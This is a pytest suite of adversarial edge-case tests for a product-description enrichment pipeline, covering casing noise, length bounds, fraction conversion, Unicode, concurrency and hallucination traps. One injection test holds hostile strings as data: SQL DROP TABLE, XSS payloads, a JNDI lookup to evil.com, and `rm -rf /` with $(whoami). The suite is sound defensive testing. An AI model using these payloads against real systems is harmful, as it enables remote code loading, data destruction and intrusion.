"""Tier 5: White-Box Adversarial Stress Testing & Coverage Hardening Suite.

This module provides exhaustive white-box adversarial stress tests targeting edge cases,
malformed supplier inputs, extreme boundary lengths, numeric/fraction conversions,
Unicode variations, concurrent thread safety, and zero-hallucination guardrails:

1. Malformed & Noisy Raw Supplier Input Strings (Random casing, excessive punctuation, duplicate tokens, code injections)
2. Extreme Boundary Length Inputs (Empty, 1-char, 1,000+ chars, INVOICE_DESC <= 40 CAPS, MOBILE_DESC 60-80 chars)
3. Extreme Decimal & 64th Fraction Conversions (Epsilons, exact 64ths, near integers, negative values, large numbers)
4. Unicode Edge Cases (Combining marks, emojis, non-ASCII quotes, zero-width spaces, RTL overrides, math symbols)
5. Concurrency Stress Testing (Multi-threaded processing, race condition checks, rapid sequential throughput)
6. Zero-Hallucination Verification (Adversarial attribute traps, fake specs, 0% hallucination assertions across 50 slots)
"""

import math
import random
import string
import concurrent.futures
from typing import Dict, Any, List
import pandas as pd
import pytest

from src.pipeline.engine import EnrichmentEngine
from src.pipeline.models import RawProduct, EnrichedProduct
from src.pipeline.uom_standardizer import UOMStandardizer
from src.pipeline.sanitizer import ProductSanitizer
from src.pipeline.delivery_mapper import to_delivery_dict, DeliveryMapper
from src.benchmark.hard_gates import (
    validate_invoice_desc,
    validate_mobile_desc,
    validate_invoice_desc_batch,
    validate_mobile_desc_batch,
    validate_lov_hallucinations,
    validate_schema_252,
    HardGateSuite,
)


# ===========================================================================
# 1. Malformed & Noisy Raw Supplier Input Strings
# ===========================================================================

class TestTier5MalformedAndNoisyInputs:
    """Test suite for adversarial noise, corrupted casing, punctuation, and injections."""

    def test_adversarial_random_casing_resilience(self, pipeline_engine):
        """Verify pipeline handles chaotic alternating and random casing across all fields."""
        noisy_raw = {
            "mfg_part_num": "pDsH-4816-aF",
            "part_desc": "pDsH4816aF dIsHwAsHeR sSt 120v 15a 50.25in StAiNlEsS sTeEl FiNiSh - DiSpLaY oNlY",
            "e1_brand": "-- uNbRaNdEd --",
            "unilog_brand": "-- nO uNiLoG bRaNd --",
            "dib_brand": "-- No DiB bRaNd --",
            "part_manuf": "ApPlIaNcE dEaLeRs CoOpErAtIvE (aPpDe)",
            "row_id": 501,
        }
        enriched = pipeline_engine.process_record(noisy_raw)

        assert enriched.manufacturer_name == "Rheem Manufacturing"
        assert "FRIGIDAIRE" in enriched.brand_name
        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80

    def test_adversarial_excessive_punctuation_and_delimiters(self, pipeline_engine):
        """Verify pipeline filters out redundant punctuation chains without corruption."""
        punct_raw = {
            "mfg_part_num": "PUNCT-999",
            "part_desc": ":::!!! Dishwasher ??? --- *** /// ((( 120V ))) +++ [[ 15A ]] === Stainless Steel %%% @@@ ### ~~~ ;;;",
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Appliance Dealers Cooperative (APPDE)",
            "row_id": 502,
        }
        enriched = pipeline_engine.process_record(punct_raw)

        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80
        assert not enriched.invoice_desc.startswith(":::")
        assert not enriched.invoice_desc.endswith(";;;")

    def test_adversarial_duplicate_token_bombing(self, pipeline_engine):
        """Verify that repetitive duplicate tokens do not produce runaway or bloated descriptions."""
        spam_desc = "Dishwasher " * 40 + "Stainless Steel " * 20 + "120V " * 15 + "15A " * 10
        spam_raw = {
            "mfg_part_num": "SPAM-TOKEN",
            "part_desc": spam_desc,
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Appliance Dealers Cooperative (APPDE)",
            "row_id": 503,
        }
        enriched = pipeline_engine.process_record(spam_raw)

        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80

    def test_adversarial_code_and_markup_injections(self, pipeline_engine):
        """Verify resistance to SQL injection, XSS, HTML tags, template tags, and command injection."""
        injections = [
            "Dishwasher'; DROP TABLE catalog; --",
            '<script>alert("PWNED")</script><img src="x" onerror="alert(1)"/> Dishwasher',
            "{{ 7 * 7 }} ${jndi:ldap://evil.com/a} Dishwasher 120V",
            "`rm -rf /` $(whoami) & echo pwned Dishwasher",
            "Dishwasher <!-- comment --> <![CDATA[ cdata ]]> 120V 15A",
        ]
        for idx, inj in enumerate(injections):
            raw = {
                "mfg_part_num": f"INJ-{idx}",
                "part_desc": inj,
                "e1_brand": "-- Unbranded --",
                "unilog_brand": "-- No Unilog Brand --",
                "dib_brand": "-- No DIB Brand --",
                "part_manuf": "Appliance Dealers Cooperative (APPDE)",
                "row_id": 510 + idx,
            }
            enriched = pipeline_engine.process_record(raw)
            assert len(enriched.invoice_desc) <= 40
            assert enriched.invoice_desc.isupper()
            assert 60 <= len(enriched.mobile_desc) <= 80
            assert "<script>" not in enriched.short_desc
            assert "DROP TABLE" not in enriched.short_desc or "Dishwasher" in enriched.short_desc

    def test_adversarial_control_characters_and_escapes(self, pipeline_engine):
        """Verify unprintable control characters, null bytes, and ANSI escape sequences are stripped."""
        control_desc = "Dishwasher\x00\x01\x02\x07\x1b[31mRed Alert\x1b[0m 120V\t\r\nStainless Steel"
        raw = {
            "mfg_part_num": "CTRL-\x00\x07-99",
            "part_desc": control_desc,
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Appliance Dealers Cooperative (APPDE)",
            "row_id": 520,
        }
        enriched = pipeline_engine.process_record(raw)

        assert "\x00" not in enriched.mfg_part_number
        assert "\x1b" not in enriched.short_desc
        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80


# ===========================================================================
# 2. Extreme Boundary Length Inputs
# ===========================================================================

class TestTier5ExtremeBoundaryLengths:
    """Test suite for extreme lengths: empty, 1-character, and 1,000+ character strings."""

    def test_adversarial_empty_and_whitespace_records(self, pipeline_engine):
        """Verify completely empty and whitespace-only records produce valid non-empty descriptions."""
        empty_inputs = [
            {"mfg_part_num": "", "part_desc": "", "part_manuf": ""},
            {"mfg_part_num": "   ", "part_desc": "   ", "part_manuf": "   "},
            {"mfg_part_num": "\t\r\n", "part_desc": "\t\r\n", "part_manuf": "\t\r\n"},
            {"mfg_part_num": "UNKNOWN", "part_desc": "\u200b\u200c\ufeff", "part_manuf": "None"},
        ]
        for idx, item in enumerate(empty_inputs):
            raw = {
                "mfg_part_num": item["mfg_part_num"],
                "part_desc": item["part_desc"],
                "e1_brand": "-- Unbranded --",
                "unilog_brand": "-- No Unilog Brand --",
                "dib_brand": "-- No DIB Brand --",
                "part_manuf": item["part_manuf"],
                "row_id": 530 + idx,
            }
            enriched = pipeline_engine.process_record(raw)
            assert len(enriched.invoice_desc) > 0, "Invoice desc must not be empty"
            assert len(enriched.invoice_desc) <= 40, f"Invoice desc exceeded 40 chars: '{enriched.invoice_desc}'"
            assert enriched.invoice_desc.isupper(), f"Invoice desc not uppercase: '{enriched.invoice_desc}'"
            assert 60 <= len(enriched.mobile_desc) <= 80, f"Mobile desc out of bounds ({len(enriched.mobile_desc)}): '{enriched.mobile_desc}'"

    def test_adversarial_single_character_records(self, pipeline_engine):
        """Verify 1-character inputs across all fields are handled robustly."""
        chars = ["A", "1", "Z", "$", "#", "x"]
        for idx, ch in enumerate(chars):
            raw = {
                "mfg_part_num": ch,
                "part_desc": ch,
                "e1_brand": ch,
                "unilog_brand": ch,
                "dib_brand": ch,
                "part_manuf": ch,
                "row_id": 540 + idx,
            }
            enriched = pipeline_engine.process_record(raw)
            assert len(enriched.invoice_desc) <= 40
            assert enriched.invoice_desc.isupper()
            assert 60 <= len(enriched.mobile_desc) <= 80

    def test_adversarial_ultra_long_record_1000_plus_chars(self, pipeline_engine):
        """Verify inputs with 1,000+ characters are cleanly processed and bounded."""
        huge_desc = "Industrial Heavy Duty Commercial Grade Stainless Steel Precision Fastener Assembly System " * 30
        huge_mpn = "MPN-" + "X" * 300
        huge_manuf = "Manufacturer Corporation International Holdings Global Enterprise LLC " * 10

        assert len(huge_desc) > 1000
        assert len(huge_mpn) > 300
        assert len(huge_manuf) > 500

        raw = {
            "mfg_part_num": huge_mpn,
            "part_desc": huge_desc,
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": huge_manuf,
            "row_id": 550,
        }
        enriched = pipeline_engine.process_record(raw)

        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80

    def test_adversarial_monolithic_token_without_spaces(self, pipeline_engine):
        """Verify single massive continuous token (500 chars without spaces) is truncated safely."""
        mono_token = "A" * 500
        raw = {
            "mfg_part_num": mono_token,
            "part_desc": mono_token,
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": mono_token,
            "row_id": 555,
        }
        enriched = pipeline_engine.process_record(raw)

        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80

    @pytest.mark.parametrize("length", [1, 2, 5, 10, 20, 39, 40, 41, 59, 60, 79, 80, 81, 100, 250, 500, 1000, 2000])
    def test_adversarial_hard_gate_invoice_desc_and_mobile_desc_inviolable(self, length: int, pipeline_engine):
        """Assert strict hard gates on description lengths across continuous spectrum of input lengths."""
        payload = ("Fastener Bolt Hex Head Stainless Steel 1/2 in x 2 in " * (length // 20 + 2))[:length]
        raw = {
            "mfg_part_num": f"LEN-{length}",
            "part_desc": payload,
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Fastener Supply Co (1234)",
            "row_id": 600 + length,
        }
        enriched = pipeline_engine.process_record(raw)

        # Invoice description assertions
        inv = enriched.invoice_desc
        is_inv_valid, inv_reasons = validate_invoice_desc(inv)
        assert is_inv_valid, f"Invoice desc violation on len {length}: {inv_reasons}, value='{inv}'"
        assert len(inv) <= 40
        assert inv.isupper()

        # Mobile description assertions
        mob = enriched.mobile_desc
        is_mob_valid, mob_reasons = validate_mobile_desc(mob)
        assert is_mob_valid, f"Mobile desc violation on len {length}: {mob_reasons}, value='{mob}'"
        assert 60 <= len(mob) <= 80


# ===========================================================================
# 3. Extreme Decimal & 64th Fraction Conversions
# ===========================================================================

class TestTier5DecimalAndFractionConversions:
    """Test suite for adversarial fraction boundaries, epsilons, negative values, and rounding."""

    def test_adversarial_fraction_tiny_epsilons(self):
        """Verify sub-threshold decimal fractions (< 0.0078125) round cleanly to whole integer."""
        uom_std = UOMStandardizer()
        assert uom_std.decimal_to_fraction(0.0001) == "0"
        assert uom_std.decimal_to_fraction(0.000001) == "0"
        assert uom_std.decimal_to_fraction(12.0005) == "12"
        assert uom_std.decimal_to_fraction(50.004) == "50"

    def test_adversarial_fraction_exact_64ths_precision(self):
        """Verify exact representation of standard fractional denominators (16ths, 8ths, 4ths, halves)."""
        uom_std = UOMStandardizer()
        assert uom_std.decimal_to_fraction(0.0625) == "1/16"
        assert uom_std.decimal_to_fraction(0.1875) == "3/16"
        assert uom_std.decimal_to_fraction(0.3125) == "5/16"
        assert uom_std.decimal_to_fraction(0.4375) == "7/16"
        assert uom_std.decimal_to_fraction(0.5625) == "9/16"
        assert uom_std.decimal_to_fraction(0.6875) == "11/16"
        assert uom_std.decimal_to_fraction(0.8125) == "13/16"
        assert uom_std.decimal_to_fraction(0.9375) == "15/16"
        assert uom_std.decimal_to_fraction(0.25) == "1/4"
        assert uom_std.decimal_to_fraction(0.5) == "1/2"
        assert uom_std.decimal_to_fraction(0.75) == "3/4"

    def test_adversarial_fraction_near_integers(self):
        """Verify decimals very close to 1.0 (>= 0.9921875) round up to next whole number."""
        uom_std = UOMStandardizer()
        assert uom_std.decimal_to_fraction(100.9999) == "101"
        assert uom_std.decimal_to_fraction(0.99999) == "1"
        assert uom_std.decimal_to_fraction(24.995) == "25"

    def test_adversarial_fraction_negative_values(self):
        """Verify negative decimal measurements preserve sign and convert to correct fractions."""
        uom_std = UOMStandardizer()
        assert uom_std.decimal_to_fraction(-0.5) == "-1/2"
        assert uom_std.decimal_to_fraction(-5.25) == "-5-1/4"
        assert uom_std.decimal_to_fraction(-10.0625) == "-10-1/16"
        assert uom_std.decimal_to_fraction(-0.0001) == "0"

    def test_adversarial_fraction_giant_numbers(self):
        """Verify multi-digit large numbers handle fractional conversions correctly."""
        uom_std = UOMStandardizer()
        assert uom_std.decimal_to_fraction(999999.5) == "999999-1/2"
        assert uom_std.decimal_to_fraction(1234567.25) == "1234567-1/4"

    def test_adversarial_dimension_complex_standardization(self):
        """Verify complex multi-axis dimensions with mixed primes, quotes, and non-standard spacing."""
        uom_std = UOMStandardizer()
        raw_dims = [
            ('12.5"x24.75"x33.0625"', "12-1/2 in x 24-3/4 in x 33-1/16 in"),
            ("1/2\"x18\"", "1/2 in x 18 in"),
            ("6'x36\"", "6 ft x 36 in"),
            ("33.4375in H x 23.875in W x 22.625in D", "33-7/16 in H x 23-7/8 in W x 22-5/8 in D"),
            ("100.0 in x 50.0 in", "100 in x 50 in"),
        ]
        for raw_in, expected_sub in raw_dims:
            std = uom_std.standardize_dimension_string(raw_in)
            assert expected_sub in std or all(part in std for part in expected_sub.split(" x "))


# ===========================================================================
# 4. Unicode Edge Cases
# ===========================================================================

class TestTier5UnicodeEdgeCases:
    """Test suite for Unicode combining characters, emojis, smart quotes, zero-width spaces, and RTL."""

    def test_adversarial_combining_diacritical_marks(self, pipeline_engine):
        """Verify decomposed Unicode combining marks (e.g. e + combining acute) normalize cleanly."""
        # Decomposed e + combining acute: e\u0301
        decomposed = "Diablo\u0301 Re\u0301sume\u0301 Cut 1/2 in x 18 in Sanding Belt"
        raw = {
            "mfg_part_num": "COMB-100",
            "part_desc": decomposed,
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Freud Inc (2435)",
            "row_id": 701,
        }
        enriched = pipeline_engine.process_record(raw)
        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80

    def test_adversarial_emojis_and_pictographs(self, pipeline_engine):
        """Verify emojis and non-alphanumeric pictographs are handled without crashing."""
        emoji_desc = "🔥🚀⚡ Professional 120V Dishwasher 🛠️🔩 15A 50.25in Stainless Steel 💯🎉"
        raw = {
            "mfg_part_num": "EMOJI-888",
            "part_desc": emoji_desc,
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Appliance Dealers Cooperative (APPDE)",
            "row_id": 702,
        }
        enriched = pipeline_engine.process_record(raw)
        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80

    def test_adversarial_smart_quotes_guillemets_and_primes(self):
        """Verify comprehensive normalization of exotic international quotes and primes."""
        sanitizer = ProductSanitizer()
        raw_text = "«Diablo» „Sanding“ ‘Belt’ “5″” 10′"
        norm = sanitizer.normalize_unicode(raw_text)
        assert "«" not in norm
        assert "»" not in norm
        assert "„" not in norm
        assert '"Diablo"' in norm or "Diablo" in norm

    def test_adversarial_zero_width_and_bidi_controls(self):
        """Verify zero-width spaces and bidirectional text overrides are completely stripped."""
        sanitizer = ProductSanitizer()
        # Text with zero-width space, zero-width non-joiner, LTR/RTL marks
        hidden_text = "Dish\u200bwash\u200cer\ufeff \u200e120V\u200f \u202aStainless\u202c"
        cleaned = sanitizer.normalize_unicode(hidden_text)
        assert "\u200b" not in cleaned
        assert "\u200c" not in cleaned
        assert "\ufeff" not in cleaned
        assert "\u200e" not in cleaned
        assert "\u200f" not in cleaned
        assert cleaned == "Dishwasher 120V Stainless"

    def test_adversarial_math_symbols_and_superscripts(self, pipeline_engine):
        """Verify mathematical symbols and superscript units (², ³, ½, ±, µ, °) are handled gracefully."""
        math_desc = "Diablo 5” Disc with ±0.05” Kerf, 45° Bevel & 120 mm² Area"
        raw = {
            "mfg_part_num": "MATH-100",
            "part_desc": math_desc,
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Freud Inc (2435)",
            "row_id": 705,
        }
        enriched = pipeline_engine.process_record(raw)
        assert len(enriched.invoice_desc) <= 40
        assert enriched.invoice_desc.isupper()
        assert 60 <= len(enriched.mobile_desc) <= 80


# ===========================================================================
# 5. Concurrency Stress Testing
# ===========================================================================

class TestTier5ConcurrencyStressTesting:
    """Test suite for multithreaded concurrency, thread safety, determinism, and rapid throughput."""

    def test_adversarial_multithreaded_batch_processing(self):
        """Verify EnrichmentEngine processes items concurrently across 16 worker threads with zero race conditions."""
        engine = EnrichmentEngine()
        raw_items = [
            RawProduct(
                mfg_part_num=f"THREAD-ITEM-{i}",
                part_desc=f"Item {i} Commercial Grade Dishwasher 120V 15A Stainless Steel 50.25in Built-in",
                e1_brand="-- Unbranded --",
                unilog_brand="-- No Unilog Brand --",
                dib_brand="-- No DIB Brand --",
                part_manuf="Appliance Dealers Cooperative (APPDE)",
                row_id=i,
            )
            for i in range(1, 101)
        ]

        def process_fn(raw: RawProduct) -> EnrichedProduct:
            return engine.process_item(raw)

        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
            results = list(executor.map(process_fn, raw_items))

        assert len(results) == 100
        for enriched in results:
            assert len(enriched.invoice_desc) <= 40
            assert enriched.invoice_desc.isupper()
            assert 60 <= len(enriched.mobile_desc) <= 80
            assert enriched.status in ["Enriched", "Flagged", "Validated"]

    def test_adversarial_concurrency_determinism(self):
        """Verify that concurrent transformations produce 100% bitwise identical results to sequential execution."""
        engine = EnrichmentEngine()
        sample_records = [
            RawProduct(
                mfg_part_num=f"DET-MPN-{i}",
                part_desc=f"DET Item {i} 1/2\"x18\" Sanding Belt 6pc 120 Grit Diablo",
                part_manuf="Freud Inc (2435)",
                row_id=i,
            )
            for i in range(1, 21)
        ]

        # Sequential baseline
        seq_results = [engine.process_item(r) for r in sample_records]

        # Concurrent run
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            conc_results = list(executor.map(engine.process_item, sample_records))

        assert len(seq_results) == len(conc_results)
        for seq, conc in zip(seq_results, conc_results):
            assert seq.invoice_desc == conc.invoice_desc
            assert seq.mobile_desc == conc.mobile_desc
            assert seq.short_desc == conc.short_desc
            assert seq.manufacturer_name == conc.manufacturer_name
            assert seq.brand_name == conc.brand_name
            assert seq.unspsc == conc.unspsc

    def test_adversarial_high_throughput_rapid_sequential(self):
        """Verify engine can process 500 rapid transformations sequentially without memory or state degradation."""
        engine = EnrichmentEngine()
        raw = RawProduct(
            mfg_part_num="RAPID-001",
            part_desc="PDSH4816AF Dishwasher SS Built-In 120V 15A 50.25in",
            part_manuf="Appliance Dealers Cooperative (APPDE)",
            row_id=1,
        )

        for i in range(500):
            res = engine.process_item(raw)
            assert len(res.invoice_desc) <= 40
            assert res.invoice_desc.isupper()
            assert 60 <= len(res.mobile_desc) <= 80


# ===========================================================================
# 6. Zero-Hallucination Adversarial Traps
# ===========================================================================

class TestTier5ZeroHallucinationAdversarialTraps:
    """Test suite for adversarial hallucination traps, fake attribute injection, and 0% LOV errors."""

    def test_adversarial_hallucination_trap_fake_mounting(self, pipeline_engine):
        """Verify fake/sci-fi mounting types are not hallucinated into canonical LOV slots."""
        raw = {
            "mfg_part_num": "TRAP-MOUNT",
            "part_desc": "Dishwasher with Levitation Floating Antigravity Quantum Mount 120V Stainless Steel",
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Appliance Dealers Cooperative (APPDE)",
            "row_id": 801,
        }
        enriched = pipeline_engine.process_record(raw)
        extracted_mounts = [a.value for a in enriched.attributes if a.label == "Mounting Type" and a.value]
        for m in extracted_mounts:
            assert m in ["Built-in", "Leg", "Surface", "Undermount", "Wall"], f"Hallucinated mounting: {m}"

    def test_adversarial_hallucination_trap_fake_material(self, pipeline_engine):
        """Verify fictional materials are not hallucinated into Material LOV slots."""
        raw = {
            "mfg_part_num": "TRAP-MAT",
            "part_desc": "Dishwasher made of Vibranium Adamantium Kryptonite Unobtanium 120V",
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Appliance Dealers Cooperative (APPDE)",
            "row_id": 802,
        }
        enriched = pipeline_engine.process_record(raw)
        extracted_mats = [a.value for a in enriched.attributes if a.label == "Material" and a.value]
        for mat in extracted_mats:
            assert "vibranium" not in mat.lower()
            assert "kryptonite" not in mat.lower()

    def test_adversarial_hallucination_trap_fake_color(self, pipeline_engine):
        """Verify fictional colors are not hallucinated into Color LOV slots."""
        raw = {
            "mfg_part_num": "TRAP-COLOR",
            "part_desc": "Dishwasher in Transparent Invisible Neon Holographic Rainbow Color 120V",
            "e1_brand": "-- Unbranded --",
            "unilog_brand": "-- No Unilog Brand --",
            "dib_brand": "-- No DIB Brand --",
            "part_manuf": "Appliance Dealers Cooperative (APPDE)",
            "row_id": 803,
        }
        enriched = pipeline_engine.process_record(raw)
        extracted_colors = [a.value for a in enriched.attributes if a.label == "Color" and a.value]
        for col in extracted_colors:
            assert "invisible" not in col.lower()
            assert "holographic" not in col.lower()

    def test_adversarial_hard_gate_lov_zero_hallucinations_suite(self, pipeline_engine):
        """Run HardGateSuite validation across a batch of adversarial trap records asserting 0% hallucinations."""
        trap_records = [
            {
                "mfg_part_num": f"TRAP-BATCH-{i}",
                "part_desc": f"Dishwasher Alien tech {i} 120V 15A Stainless Steel Built-in with Holographic Sensor",
                "e1_brand": "-- Unbranded --",
                "unilog_brand": "-- No Unilog Brand --",
                "dib_brand": "-- No DIB Brand --",
                "part_manuf": "Appliance Dealers Cooperative (APPDE)",
                "row_id": 850 + i,
            }
            for i in range(1, 21)
        ]
        enriched_batch = pipeline_engine.process_batch(trap_records)
        delivery_dicts = [to_delivery_dict(e) for e in enriched_batch]

        # Run Hard Gate LOV validation
        lov_gate = validate_lov_hallucinations(delivery_dicts)
        assert lov_gate.passed, f"LOV Hard Gate failed with {lov_gate.violation_count} hallucinations: {lov_gate.violations}"
        assert lov_gate.violation_count == 0
        assert lov_gate.compliance_rate == 1.0

    def test_adversarial_attribute_slots_50_integrity(self, pipeline_engine):
        """Verify all 50 triplet slots maintain absolute schema integrity and correct sequence."""
        raw = {
            "mfg_part_num": "SLOT-50-CHECK",
            "part_desc": "Commercial Dishwasher 120V 15A 47 dBA Leg Mount 5 Wash Cycles Stainless Steel",
            "part_manuf": "Appliance Dealers Cooperative (APPDE)",
            "row_id": 900,
        }
        enriched = pipeline_engine.process_record(raw)
        row = to_delivery_dict(enriched)

        assert len(row) == 252, f"Expected 252 columns in delivery dict, got {len(row)}"

        # Validate all 50 triplet slots
        for i in range(1, 51):
            assert f"ATTRIBUTE_LABEL {i}" in row
            assert f"ATTRIBUTE_VALUE {i}" in row
            assert f"ATTRIBUTE_UOM {i}" in row

            lbl = row[f"ATTRIBUTE_LABEL {i}"]
            val = row[f"ATTRIBUTE_VALUE {i}"]
            uom = row[f"ATTRIBUTE_UOM {i}"]

            # If label is empty, value and uom must also be empty
            if not lbl:
                assert val == "", f"Slot {i} has empty label but non-empty value: '{val}'"
                assert uom == "", f"Slot {i} has empty label but non-empty UOM: '{uom}'"
